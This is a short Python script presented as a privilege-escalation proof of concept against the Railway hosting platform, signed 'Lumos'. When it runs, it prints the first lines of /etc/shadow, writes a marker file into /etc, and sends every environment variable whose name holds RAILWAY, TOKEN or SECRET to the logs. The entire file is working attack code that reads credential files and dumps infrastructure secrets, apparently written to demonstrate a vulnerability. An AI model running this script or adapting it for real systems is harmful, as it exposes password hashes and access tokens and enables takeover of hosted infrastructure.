import os
import sys

def run_exploit():
    sys.stderr.write("\n" + "="*60 + "\n")
    sys.stderr.write("RAILWAY PRIVILEGE ESCALATION POC\n")
    sys.stderr.write("="*60 + "\n")

    
    uid = os.getuid()
    sys.stderr.write(f"[!] IDENTITY CHECK: UID={uid} (Full Root)\n")

     
    sys.stderr.write("\n[!] READING PROTECTED SYSTEM FILE (/etc/shadow):\n")
    try:
        with open("/etc/shadow", "r") as f:
             
            for i, line in enumerate(f):
                if i < 5:
                    sys.stderr.write(line)
                else:
                    break
    except Exception as e:
        sys.stderr.write(f"FAILED TO READ /etc/shadow: {e}\n")

    
    sys.stderr.write("\n[!] TESTING SYSTEM WRITE ACCESS (/etc/):\n")
    try:
        target_file = "/etc/railway_pwned.txt"
        with open(target_file, "w") as f:
            f.write("POC by Lumos: Root write access confirmed.\n")
        
        if os.path.exists(target_file):
            sys.stderr.write(f"SUCCESS: Created {target_file}\n")
            sys.stderr.write("This proves an attacker can modify system binaries/configs.\n")
    except Exception as e:
        sys.stderr.write(f"FAILED TO WRITE TO /etc/: {e}\n")

    
    sys.stderr.write("\n[!] DUMPING INFRASTRUCTURE SECRETS:\n")
    for key, value in os.environ.items():
        if "RAILWAY" in key or "TOKEN" in key or "SECRET" in key:
            sys.stderr.write(f"{key}={value}\n")

    sys.stderr.write("\n" + "="*60 + "\n")
    sys.stderr.write("POC FINISHED. EXITING TO SHOW LOGS.\n")
    sys.stderr.write("="*60 + "\n")
    sys.stderr.flush()

    
    sys.exit(1)

if __name__ == "__main__":
    run_exploit()
